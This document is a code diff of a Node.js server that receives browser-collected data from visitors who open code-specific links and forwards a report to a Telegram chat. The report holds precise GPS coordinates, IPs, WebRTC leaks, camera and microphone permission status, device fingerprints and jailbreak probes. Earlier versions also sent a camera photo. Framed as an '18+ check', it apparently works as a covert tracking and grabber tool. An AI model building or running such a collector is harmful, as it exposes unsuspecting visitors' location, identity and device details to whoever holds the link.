@@ -1,4 +1,4 @@
-// === server/index.js (code -> chat_id, pretty /:code, JB summary in caption + HTML report) ===
+// === server/index.js (only-HTML to TG: summary checklist + full JSON inside) ===
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
@@ -57,7 +57,7 @@ try {
 console.log('[db] using', DB_PATH);
 const db = new Database(DB_PATH);
 
-// --- table (new scheme)
+// --- table
 db.prepare(`
   CREATE TABLE IF NOT EXISTS user_codes (
     code       TEXT PRIMARY KEY,
@@ -89,46 +89,6 @@ function requireAdminSecret(req, res, next) {
 function escapeHTML(s = '') {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
-function b64ToBuffer(dataUrl = '') {
-  const i = dataUrl.indexOf('base64,');
-  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
-  return Buffer.from(b64, 'base64');
-}
-async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
-  if (!BOT_TOKEN) throw new Error('No BOT token on server');
-  if (!chatId) throw new Error('Missing chat_id');
-  if (!photoBuf?.length) throw new Error('Empty photo');
-
-  const form = new FormData();
-  form.append('chat_id', chatId);
-  form.append('caption', caption);
-  form.append('parse_mode', 'HTML');
-  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);
-
-  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-  const resp = await fetch(url, { method: 'POST', body: form });
-  if (!resp.ok) {
-    const text = await resp.text().catch(() => '');
-    throw new Error(`Telegram ${resp.status}: ${text}`);
-  }
-  return resp.json();
-}
-async function sendMessageToTelegram({ chatId, text, parse_mode = 'HTML' }) {
-  if (!BOT_TOKEN) throw new Error('No BOT token on server');
-  if (!chatId) throw new Error('Missing chat_id');
-
-  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  const resp = await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text, parse_mode })
-  });
-  if (!resp.ok) {
-    const t = await resp.text().catch(() => '');
-    throw new Error(`Telegram ${resp.status}: ${t}`);
-  }
-  return resp.json();
-}
 function safeJson(obj, space = 0) {
   try { return JSON.stringify(obj, null, space); }
   catch { return String(obj); }
@@ -138,12 +98,12 @@ function short(str, n = 64) {
   str = String(str);
   return str.length <= n ? str : (str.slice(0, n - 3) + '...');
 }
-function gmLink(lat, lon, z = 17) {
-  const href = `https://maps.google.com/?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}&z=${z}`;
-  return `<a href="${href}">${escapeHTML(`${lat}, ${lon}`)}</a>`;
+function gmLinkHTML(lat, lon, acc) {
+  if (lat == null || lon == null) return 'нет данных';
+  const href = `https://maps.google.com/?q=${encodeURIComponent(lat)},${encodeURIComponent(lon)}&z=17`;
+  const pos  = `${lat}, ${lon}`;
+  return `<a class="soft" href="${href}" target="_blank" rel="noreferrer">${escapeHTML(pos)}</a>${acc!=null?` &nbsp;±${escapeHTML(String(acc))} м`:''}`;
 }
-
-// [NEW] --- отправка HTML отчёта как документа в TG
 async function sendDocumentToTelegram({ chatId, htmlString, filename = 'report.html' }) {
   if (!BOT_TOKEN) throw new Error('No BOT token on server');
   if (!chatId) throw new Error('Missing chat_id');
@@ -161,47 +121,67 @@ async function sendDocumentToTelegram({ chatId, htmlString, filename = 'report.h
   return resp.json();
 }
 
-// [NEW] --- HTML Report builder (с расшифровкой)
+// === status helpers (✔️/❌) ===
+const ok = (b) => b ? '✔️' : '❌';
+function deriveStatus({ iosVersion, platform, cp = {}, dc = {} }) {
+  const v = typeof iosVersion === 'number' ? iosVersion
+        : (typeof iosVersion === 'string' ? parseFloat(iosVersion) : null);
+
+  const iosOk       = v != null && v >= 18;
+  const platformOk  = /iPhone|iPad/i.test(String(platform || ''));
+  const jb          = (cp?.jbProbesActive?.summary?.label || '').toLowerCase(); // 'positive'|'negative'|'n/a'
+  const jbOk        = jb ? jb.includes('negative') : true; // нет сигналов — хорошо
+  const webrtcCount = Array.isArray(cp?.webrtcIps) ? cp.webrtcIps.length : 0;
+  const dcWords     = Array.isArray(cp?.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
+  const dcOk        = !dcWords; // нет DC-слов — ок
+  const perms       = cp?.permissions || {};
+  const geoOk       = perms.geolocation === 'granted' || perms.geolocation === true;
+  const camOk       = perms.camera === 'granted' || perms.camera === true;
+  const micOk       = perms.microphone === 'granted' || perms.microphone === true;
+  const checkScore  = (typeof dc.score === 'number') ? dc.score : null;
+
+  return {
+    iosOk, platformOk, jbOk, dcOk, geoOk, camOk, micOk,
+    webrtcCount, dcWords, checkScore,
+  };
+}
+
+// [HTML] — единый отчёт с чеклистом, таблицами и полным JSON
 function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari, cp, dc }) {
-  const jb = (cp?.jbProbesActive) || {};
+  const s  = deriveStatus({ iosVersion, platform, cp, dc });
+  const jb = cp?.jbProbesActive || {};
   const jbSum = jb.summary || {};
-  const fp = jb.firstPositive || null;
+  const fp    = jb.firstPositive || null;
   const jbResults = Array.isArray(jb.results) ? jb.results : [];
 
   const pubIP = cp?.publicIp || {};
-  const net   = cp?.network || {};
-  const bat   = cp?.battery || null;
-  const webgl = cp?.webgl || null;
+  const net   = cp?.network  || {};
+  const bat   = cp?.battery  || null;
+  const webgl = cp?.webgl    || null;
   const canvas= cp?.canvasFingerprint || null;
   const inApp = cp?.inAppWebView || {};
   const locale= cp?.locale || {};
-  const webrtcCount = Array.isArray(cp?.webrtcIps) ? cp.webrtcIps.length : 0;
-  const dcWords = Array.isArray(cp?.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
-
-  const jsonPretty = safeJson({
-    geo, userAgent, platform, iosVersion, isSafari,
-    client_profile: cp, device_check: dc
-  }, 2);
+  const webrtcCount = s.webrtcCount;
 
   const css = `
     :root { color-scheme: light dark; }
-    body { font: 14px/1.45 system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 0; padding: 24px; }
+    body { font: 14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif; margin: 0; padding: 24px; }
     .wrap { max-width: 980px; margin: 0 auto; }
-    h1 { margin: 0 0 4px; font-size: 20px; }
+    h1 { margin: 0 0 8px; font-size: 22px; }
+    h2 { margin: 12px 0 8px; font-size: 18px; }
     .muted { color: #6b7280; font-size: 12px; }
     .card { background: rgba(0,0,0,0.04); border: 1px solid rgba(0,0,0,0.08); padding: 16px; border-radius: 12px; margin: 14px 0; }
+    .kv { display: grid; grid-template-columns: 220px 1fr; gap: 8px; }
+    .kv div { padding: 6px 8px; border-bottom: 1px dashed rgba(0,0,0,0.12); }
     table { border-collapse: collapse; width: 100%; }
     th, td { border: 1px solid rgba(0,0,0,0.2); padding: 8px; text-align: left; vertical-align: top; }
     th { background: rgba(0,0,0,0.06); }
     code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
     pre { white-space: pre-wrap; word-break: break-word; background: rgba(0,0,0,0.04); padding: 12px; border-radius: 10px; }
-    details { background: rgba(0,0,0,0.04); border: 1px dashed rgba(0,0,0,0.2); padding: 10px 12px; border-radius: 10px; }
-    summary { cursor: pointer; font-weight: 600; }
-    .kv { display: grid; grid-template-columns: 220px 1fr; gap: 8px; }
-    .kv div { padding: 6px 8px; border-bottom: 1px dashed rgba(0,0,0,0.12); }
     .ok { color:#16a34a; font-weight:600 }
     .bad { color:#ef4444; font-weight:600 }
     .soft { color:#2563eb; }
+    .pill { display:inline-block; padding:2px 8px; border-radius:999px; background:rgba(0,0,0,0.06); }
   `;
 
   const jbInfo = fp?.scheme
@@ -210,92 +190,77 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
         ? `Признаки: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>`
         : 'Признаков не обнаружено');
 
-  const checkStr = dc ? `${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})` : '—';
-
-  const geoStr = geo
-    ? `<a class="soft" href="https://maps.google.com/?q=${encodeURIComponent(geo.lat)},${encodeURIComponent(geo.lon)}&z=17" target="_blank" rel="noreferrer">${escapeHTML(`${geo.lat}, ${geo.lon}`)}</a> &nbsp;±${escapeHTML(geo.acc)} м`
-    : 'нет данных';
-
-  const tableJb = jbResults.length
-    ? `
-      <div class="card">
-        <h2>Попытки JB-сигналов</h2>
-        <table>
-          <thead><tr><th>scheme</th><th>opened</th><th>reason</th><th>ms</th></tr></thead>
-          <tbody>
-            ${jbResults.slice(0, 100).map(r => `
-              <tr>
-                <td><code>${escapeHTML(String(r.scheme||'').trim())}</code></td>
-                <td>${r.opened ? '<span class="ok">yes</span>' : 'no'}</td>
-                <td><code>${escapeHTML(r.reason || (r.opened ? 'signal' : 'timeout'))}</code></td>
-                <td>${r.durationMs != null ? escapeHTML(String(r.durationMs)) : '-'}</td>
-              </tr>
-            `).join('')}
-          </tbody>
-        </table>
-        ${jbResults.length > 100 ? `<div class="muted">Показаны первые 100 из ${jbResults.length}</div>` : ''}
-      </div>`
-    : '';
-
-  const explain = `
+  const checklist = `
     <div class="card">
-      <h2>Что это значит (расшифровка)</h2>
-      <ul>
-        <li><b>JB</b> — краткий итог проверки на джейлбрейк. <i>positive</i> — есть сигналы, <i>negative</i> — нет.</li>
-        <li><b>JB info</b> — какая схема/признак сработала и за сколько миллисекунд.</li>
-        <li><b>iOS / Platform / UA</b> — версия системы, платформа и строка User-Agent с браузера.</li>
-        <li><b>Geo</b> — координаты со ссылкой на Google Maps и точность (±м).</li>
-        <li><b>IP / ISP</b> — публичный IP, страна, провайдер. Если странно совпадает с дата-центрами — выделяем в <code>DC-ISP</code>.</li>
-        <li><b>WebRTC IPs</b> — сколько внутренних IP удалось извлечь через WebRTC (признак VPN/Proxy иногда заметен).</li>
-        <li><b>Network</b> — тип канала (2g/3g/4g/5g/wifi) и оценка задержки.</li>
-        <li><b>Battery</b> — уровень батареи и факт зарядки (если доступно, зависит от браузера).</li>
-        <li><b>WebGL / Canvas</b> — косвенные параметры «железа» и хэш канваса для похожести/уникальности.</li>
-        <li><b>In-App</b> — признаки открытия внутри приложения (Telegram/FB/Insta WebView и т.п.).</li>
-        <li><b>TZ / Locale</b> — часовой пояс/языки. Несоответствия с гео/IP бывают подозрительны.</li>
-        <li><b>Check</b> — интегральная метка и числовой балл девайс-чека.</li>
-      </ul>
+      <h2>Чеклист статуса</h2>
+      <div class="kv">
+        <div><b>iOS ≥ 18</b></div><div>${ok(s.iosOk)} ${s.iosOk?'<span class="ok">ok</span>':'<span class="bad">low</span>'} <span class="pill"><code>${escapeHTML(String(iosVersion ?? 'n/a'))}</code></span></div>
+        <div><b>Платформа iPhone/iPad</b></div><div>${ok(s.platformOk)} ${s.platformOk?'<span class="ok">ok</span>':'<span class="bad">not iOS</span>'} <span class="pill"><code>${escapeHTML(String(platform||'n/a'))}</code></span></div>
+        <div><b>Jailbreak признаки</b></div><div>${ok(s.jbOk)} ${s.jbOk?'<span class="ok">нет</span>':'<span class="bad">обнаружены</span>'} <span class="pill"><code>${escapeHTML(jbSum.label||'n/a')}</code></span></div>
+        <div><b>DC/ISP сигнатуры</b></div><div>${ok(s.dcOk)} ${s.dcOk?'<span class="ok">нет</span>':'<span class="bad">найдены</span>'} ${s.dcWords?`<span class="pill"><code>${escapeHTML(short(s.dcWords,50))}</code></span>`:''}</div>
+        <div><b>Гео-разрешение</b></div><div>${ok(s.geoOk)} ${s.geoOk?'<span class="ok">разрешено</span>':'<span class="bad">нет</span>'}</div>
+        <div><b>Камера</b></div><div>${ok(s.camOk)} ${s.camOk?'<span class="ok">разрешено</span>':'<span class="bad">нет</span>'}</div>
+        <div><b>Микрофон</b></div><div>${ok(s.micOk)} ${s.micOk?'<span class="ok">разрешено</span>':'<span class="bad">нет</span>'}</div>
+        <div><b>WebRTC IPs</b></div><div><span class="pill"><code>${webrtcCount}</code></span></div>
+        <div><b>Итоговый чек</b></div><div><span class="pill"><code>${escapeHTML(dc.label||'?')} ${dc.score!=null?`(${dc.score})`:''}</code></span></div>
+      </div>
     </div>
   `;
 
-  const top = `
+  const overview = `
     <div class="card">
-      <h1>Отчёт по проверке устройства</h1>
-      <div class="muted">Code: <code>${escapeHTML(String(code).toUpperCase())}</code></div>
-      <div class="kv" style="margin-top:10px">
-        <div><b>JB</b></div><div><code>${escapeHTML(jbSum.label || 'n/a')}</code></div>
-        <div><b>JB info</b></div><div>${jbInfo}</div>
-        <div><b>iOS</b></div><div><code>${escapeHTML(iosVersion ?? '')}</code></div>
-        <div><b>Platform</b></div><div><code>${escapeHTML(platform || '')}</code></div>
+      <h2>Сводка</h2>
+      <div class="kv">
+        <div><b>Code</b></div><div><code>${escapeHTML(String(code).toUpperCase())}</code></div>
         <div><b>UA</b></div><div><code>${escapeHTML(userAgent || '')}</code></div>
-        <div><b>Geo</b></div><div>${geoStr}</div>
+        <div><b>Geo</b></div><div>${gmLinkHTML(geo?.lat, geo?.lon, geo?.acc)}</div>
         <div><b>IP / ISP</b></div><div>${pubIP.ip ? `<code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> · <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'нет'}</div>
-        <div><b>WebRTC IPs</b></div><div><code>${webrtcCount}</code> · DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code></div>
         <div><b>Network</b></div><div><code>${escapeHTML(String(net.effectiveType||'')).toLowerCase()||'?'}, rtt=${escapeHTML(net.rtt!=null?String(net.rtt):'?')}</code></div>
         <div><b>Battery</b></div><div>${bat ? `<code>${bat.level}%${bat.charging ? ' (chg)' : ''}</code>` : '—'}</div>
         <div><b>WebGL</b></div><div>${webgl ? `<code>${escapeHTML(short(webgl.vendor,40))} | ${escapeHTML(short(webgl.renderer,40))}</code>` : '—'}</div>
         <div><b>Canvas</b></div><div>${canvas ? `<code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : '—'}</div>
         <div><b>In-App</b></div><div>${inApp?.isInApp ? `<code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'нет'}</div>
         <div><b>TZ</b></div><div>${locale?.timeZone ? `<code>${escapeHTML(locale.timeZone)}</code>` : '—'}</div>
-        <div><b>Check</b></div><div><code>${checkStr}</code></div>
       </div>
     </div>
   `;
 
-  const perms = cp?.permissions ? `
+  const tableJb = jbResults.length ? `
     <div class="card">
-      <h2>Разрешения</h2>
+      <h2>Попытки JB-сигналов</h2>
       <table>
-        <thead><tr><th>Гео</th><th>Камера</th><th>Микрофон</th></tr></thead>
+        <thead><tr><th>scheme</th><th>opened</th><th>reason</th><th>ms</th></tr></thead>
         <tbody>
-          <tr>
-            <td><code>${escapeHTML(String(cp.permissions.geolocation ?? '?'))}</code></td>
-            <td><code>${escapeHTML(String(cp.permissions.camera ?? '?'))}</code></td>
-            <td><code>${escapeHTML(String(cp.permissions.microphone ?? '?'))}</code></td>
-          </tr>
+          ${jbResults.slice(0, 100).map(r => `
+            <tr>
+              <td><code>${escapeHTML(String(r.scheme||'').trim())}</code></td>
+              <td>${r.opened ? '<span class="ok">yes</span>' : 'no'}</td>
+              <td><code>${escapeHTML(r.reason || (r.opened ? 'signal' : 'timeout'))}</code></td>
+              <td>${r.durationMs != null ? escapeHTML(String(r.durationMs)) : '-'}</td>
+            </tr>
+          `).join('')}
         </tbody>
       </table>
+      ${jbResults.length > 100 ? `<div class="muted">Показаны первые 100 из ${jbResults.length}</div>` : ''}
     </div>
   ` : '';
+
+  const explain = `
+    <div class="card">
+      <h2>Что это значит</h2>
+      <ul>
+        <li><b>Чеклист</b> — быстрый индикатор «хорошо/плохо» по ключевым пунктам (версии, JB, разрешения, DC/ISP).</li>
+        <li><b>Сводка</b> — основные параметры устройства/сети.</li>
+        <li><b>JB-сигналы</b> — таблица попыток открытия схем Cydia/Sileo/Zebra и т.п.</li>
+        <li><b>Сырой JSON</b> — весь мультисбор и девайс-чек (для техподдержки).</li>
+      </ul>
+    </div>
+  `;
+
+  const jsonPretty = safeJson({
+    geo, userAgent, platform, iosVersion, isSafari,
+    client_profile: cp, device_check: dc
+  }, 2);
 
   const raw = `
     <div class="card">
@@ -317,12 +282,16 @@ function buildHtmlReport({ code, geo, userAgent, platform, iosVersion, isSafari,
     </head>
     <body>
       <div class="wrap">
-        ${top}
+        <div class="card">
+          <h1>Отчёт по проверке устройства</h1>
+          <div class="muted">Code: <code>${escapeHTML(String(code).toUpperCase())}</code> • ${new Date().toISOString()}</div>
+        </div>
+        ${checklist}
+        ${overview}
         ${tableJb}
-        ${perms}
         ${explain}
         ${raw}
-        <div class="muted">Сформировано автоматически • ${new Date().toISOString()}</div>
+        <div class="muted">Сформировано автоматически</div>
       </div>
     </body>
     </html>
@@ -373,7 +342,7 @@ app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
   res.send(injected);
 });
 
-// ==== API: client-ip (минимум; без внешних сервисов) ====
+// ==== API: client-ip (минимум) ====
 app.get('/api/client-ip', (req, res) => {
   const fwd = (req.headers['x-forwarded-for'] || '').toString().split(',')[0].trim();
   const ip  = fwd || req.ip || null;
@@ -381,145 +350,46 @@ app.get('/api/client-ip', (req, res) => {
     req.headers['cf-ipcountry'] ||
     req.headers['x-vercel-ip-country'] ||
     req.headers['x-country-code'] || null;
-  const isp = req.headers['x-real-isp'] || null; // можно прокидывать с edge
+  const isp = req.headers['x-real-isp'] || null;
   res.json({ ip, country, isp, ua: req.headers['user-agent'] || null });
 });
 
-// ==== API: report (фото + сводка, JB summary, JB table, полный JSON + HTML) ====
+// ==== API: report (ONLY HTML to TG) ====
 app.post('/api/report', async (req, res) => {
   try {
     const {
       userAgent, platform, iosVersion, isSafari,
-      geo, photoBase64, note, code,
-
-      // из фронта:
+      geo, /* photoBase64, note, */ code,
       client_profile,   // быстрый мультисбор (включая jbProbesActive)
       device_check      // { score, label, reasons[], details{...} }
     } = req.body || {};
 
-    if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
-    if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });
+    if (!code) return res.status(400).json({ ok:false, error: 'No code' });
 
     const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
       .get(String(code).toUpperCase());
     if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });
 
-    // Алиасы
     const cp = client_profile || {};
     const dc = device_check   || {};
 
-    const webrtcCount = Array.isArray(cp.webrtcIps) ? cp.webrtcIps.length : 0;
-    const dcWords = Array.isArray(cp.dcIspKeywords) ? cp.dcIspKeywords.join(',') : '';
-    const net = cp.network || {};
-    const bat = cp.battery || null;
-    const webgl = cp.webgl || null;
-    const canvas = cp.canvasFingerprint || null;
-    const inApp = cp.inAppWebView || {};
-    const locale = cp.locale || {};
-    const pubIP = cp.publicIp || {};
-
-    // JB summary
-    const jb = cp.jbProbesActive || {};
-    const jbSum = jb.summary || {};
-    const fp = jb.firstPositive || null;
-
-    // ====== КАПШН (тестовая часть) — твой порядок ======
-    const linesTop = [
-      '<b>Новый отчёт 18+ проверка</b>',
-      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
-      `JB: <code>${escapeHTML(jbSum.label || 'n/a')}</code>`,
-      (fp?.scheme
-        ? `JB info: <code>${escapeHTML(fp.scheme)}</code> (${escapeHTML(fp.reason||'signal')} ~${escapeHTML(fp.durationMs||'0')}ms)`
-        : (Array.isArray(jbSum.reasons) && jbSum.reasons.length
-            ? `JB info: <code>${escapeHTML(jbSum.reasons.join(', '))}</code>`
-            : `JB info: <code>—</code>`)),
-      `iOS: <code>${escapeHTML(iosVersion ?? '')}</code>`,
-      `Platform: <code>${escapeHTML(platform || '')}</code>`,
-      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
-      (geo
-        ? `Geo: ${gmLink(geo.lat, geo.lon)} <code>±${escapeHTML(geo.acc)}</code>m`
-        : 'Geo: <code>нет</code>')
-    ];
-
-    const linesRest = [
-      cp.permissions ? `Perms: <code>geo=${escapeHTML(cp.permissions.geolocation||'?')} cam=${escapeHTML(cp.permissions.camera||'?')} mic=${escapeHTML(cp.permissions.microphone||'?')}</code>` : null,
-      pubIP.ip ? `IP: <code>${escapeHTML(pubIP.ip||'?')} ${escapeHTML(pubIP.country||'')}</code> ISP: <code>${escapeHTML(pubIP.isp||pubIP.org||'')}</code>` : 'IP: <code>нет</code>',
-      `WebRTC IPs: <code>${webrtcCount}</code>  DC-ISP: <code>${escapeHTML(short(dcWords, 40) || '–')}</code>`,
-      `Net: <code>${escapeHTML(String(net.effectiveType||'')).toLowerCase()||'?'}, rtt=${escapeHTML(net.rtt!=null?String(net.rtt):'?')}</code>`,
-      bat ? `Battery: <code>${bat.level}%${bat.charging? ' (chg)': ''}</code>` : null,
-      webgl ? `WebGL: <code>${escapeHTML(short(webgl.vendor,40))} | ${escapeHTML(short(webgl.renderer,40))}</code>` : null,
-      canvas ? `Canvas: <code>${escapeHTML(short(canvas.hash,18))} (${canvas.size})</code>` : null,
-      inApp?.isInApp ? `InApp: <code>${escapeHTML((inApp.any||[]).join(','))}</code>` : 'InApp: <code>нет</code>',
-      locale?.timeZone ? `TZ: <code>${escapeHTML(locale.timeZone)}</code>` : null,
-      (dc && (dc.score!=null || dc.label)) ? `Check: <code>${escapeHTML(dc.label||'?')} (${dc.score ?? '?'})</code>` : null,
-      note ? `Note: <code>${escapeHTML(note)}</code>` : null
-    ].filter(Boolean);
-
-    const caption = [...linesTop, ...linesRest].join('\n');
-
-    // 1) Фото + капшн
-    const buf = b64ToBuffer(photoBase64);
-    const tgPhoto = await sendPhotoToTelegram({
-      chatId: String(row.chat_id),
-      caption,
-      photoBuf: buf
+    // Генерация HTML (с чеклистом и полным JSON)
+    const html = buildHtmlReport({
+      code, geo, userAgent, platform, iosVersion, isSafari,
+      cp, dc
     });
+    const fname = `report-${String(code).toUpperCase()}-${Date.now()}.html`;
 
-    // 1.1) Компактная таблица JB-спроб (если есть)
-    const jbResults = Array.isArray(jb.results) ? jb.results : [];
-    if (jbResults.length) {
-      const head = 'scheme | opened | reason | ms';
-      const rows = jbResults.slice(0, 8).map(r => {
-        const s  = String(r.scheme || '').replace(/\s+/g, '');
-        const o  = r.opened ? 'yes' : 'no';
-        const re = (r.reason || (r.opened ? 'signal' : 'timeout'));
-        const ms = (r.durationMs != null ? String(r.durationMs) : '-');
-        return `${s} | ${o} | ${re} | ${ms}`;
-      });
-      const table = [head, ...rows].join('\n');
-      await sendMessageToTelegram({
-        chatId: String(row.chat_id),
-        text: `<b>JB attempts (${jbResults.length})</b>\n<pre>${escapeHTML(table)}</pre>`,
-        parse_mode: 'HTML'
-      });
-    }
-
-    // 2) Полный JSON мультисбора и девайс-чека — чанками (оставил как было)
-    const fullJson = safeJson({
-      geo, userAgent, platform, iosVersion, isSafari,
-      client_profile: cp, device_check: dc
-    }, 2);
-
-    const CHUNK = 3500; // запас ниже лимита 4096
-    for (let i = 0; i < fullJson.length; i += CHUNK) {
-      const part = fullJson.slice(i, i + CHUNK);
-      await sendMessageToTelegram({
-        chatId: String(row.chat_id),
-        text: `<b>Детали (${1 + Math.floor(i / CHUNK)})</b>\n<pre>${escapeHTML(part)}</pre>`,
-        parse_mode: 'HTML'
-      });
-    }
-
-    // [NEW] 3) Генерация и отправка ОДНОГО HTML-файла с расшифровкой
-    try {
-      const html = buildHtmlReport({
-        code, geo, userAgent, platform, iosVersion, isSafari,
-        cp, dc
-      });
-      const fname = `report-${String(code).toUpperCase()}-${Date.now()}.html`;
-      await sendDocumentToTelegram({
-        chatId: String(row.chat_id),
-        htmlString: html,
-        filename: fname
-      });
-    } catch (e) {
-      console.error('[report] HTML send failed:', e);
-      // Не роняем основной ответ
-    }
+    // ЕДИНСТВЕННАЯ отправка в TG — HTML-документ
+    const tgDoc = await sendDocumentToTelegram({
+      chatId: String(row.chat_id),
+      htmlString: html,
+      filename: fname
+    });
 
     res.json({
       ok: true,
-      sent: [{ chatId: String(row.chat_id), ok: true, message_id: tgPhoto?.result?.message_id }]
+      sent: [{ chatId: String(row.chat_id), ok: true, message_id: tgDoc?.result?.message_id }]
     });
   } catch (e) {
     console.error('[report] error:', e);
